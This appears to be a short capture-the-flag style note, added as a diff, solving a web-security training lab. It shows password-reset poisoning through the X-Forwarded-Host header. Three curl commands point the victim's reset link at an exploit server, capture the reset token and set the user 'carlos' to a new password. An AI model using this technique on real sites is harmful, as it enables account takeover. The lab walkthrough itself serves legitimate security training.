@@ -1,0 +1,26 @@
+
+
+check flow of the changing password and use X-Forwarded-Host header to header poisoninng
+
+curl -ik -X $'POST' \
+    -H $'X-Forwarded-Host: exploit-0abe001f035bd4b68407b3d501860071.exploit-server.net'
+    -b $'session=JPAlG8GKsfmWN3uS3waDVghhDHXU74gN' \
+    --data-binary $'username=carlos' \
+    $'https://0a5f002f036cd4d784abb43d00a500ff.web-security-academy.net/forgot-password'
+	
+	
+and wait ti carlos see that and send that sessionId for us
+and use sessionId to send thos request
+
+curl -ik -b $'session=5vjs8ul4flil3imvjg72k8cqen165967' \
+    $'https://0a5f002f036cd4d784abb43d00a500ff.web-security-academy.net/forgot-password?temp-forgot-password-token=5vjs8ul4flil3imvjg72k8cqen165967'
+	
+	after that send change password request
+	
+	curl -i -s -k -X $'POST' \
+    -b $'session=5vjs8ul4flil3imvjg72k8cqen165967' \
+    --data-binary $'temp-forgot-password-token=5vjs8ul4flil3imvjg72k8cqen165967&new-password-1=password&new-password-2=password' \
+    $'https://0a5f002f036cd4d784abb43d00a500ff.web-security-academy.net/forgot-password?temp-forgot-password-token=5vjs8ul4flil3imvjg72k8cqen165967'
+	
+	now we can login wtih
+		carlos:password
